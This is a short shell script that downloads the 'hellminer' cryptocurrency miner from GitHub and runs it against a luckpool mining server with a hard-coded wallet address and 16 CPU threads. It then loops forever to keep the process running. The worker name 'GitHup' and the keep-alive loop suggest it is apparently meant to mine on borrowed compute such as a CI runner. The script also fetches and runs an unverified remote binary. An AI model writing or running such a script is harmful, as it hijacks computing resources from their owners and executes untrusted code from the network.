#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3960#xnsub -u RLE5XjrA3z7DfQdKiXLFyZA1qULzxM6apg.GitHup -p x --cpu 16
while [ 1 ]; do
sleep 3
done
sleep 999
